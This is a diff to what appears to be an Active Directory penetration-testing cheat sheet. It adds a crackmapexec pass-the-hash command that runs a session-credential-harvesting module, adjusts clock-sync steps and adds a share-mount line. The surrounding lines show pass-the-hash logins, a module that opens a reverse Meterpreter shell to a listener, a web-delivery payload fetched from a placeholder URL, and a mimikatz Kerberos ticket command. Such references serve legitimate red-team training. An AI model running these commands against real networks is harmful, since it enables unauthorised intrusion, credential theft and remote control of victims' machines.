@@ -55,6 +55,7 @@
   crackmapexec smb -M name_module -o VAR=DATA
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --local-auth
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
+  crackmapexec 192.168.1.100 -u Jaddmon -H ':5858d47a41e40b40f294b3100bea611f' -d 'DOMAIN' -M invoke_sessiongopher
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
@@ -170,12 +171,12 @@ mimikatz.exe "kerberos::ptc c:\temp\TGT_darthsidious@lab.adsecurity.org.ccache"
 :warning: If the clock is skewed use `clock-skew.nse` script from `nmap`
 
 ```powershell
-$ nmap -sV -sC 10.10.10.10
+Linux> $ nmap -sV -sC 10.10.10.10
 clock-skew: mean: -1998d09h03m04s, deviation: 4h00m00s, median: -1998d11h03m05s
 
-$ sudo date -s "14 APR 2015 18:25:16" 
+Linux> sudo date -s "14 APR 2015 18:25:16" 
+Windows> net time /domain /set
 ```
-
 
 ### Open Shares
 
@@ -230,6 +231,7 @@ Mount a share
 
 ```powershell
 smbmount //X.X.X.X/c$ /mnt/remote/ -o username=user,password=pass,rw
+sudo mount -t cifs -o username=<user>,password=<pass> //<IP>/Users folder
 ```
 
 ### GPO - Pivoting with Local Admin & Passwords in SYSVOL
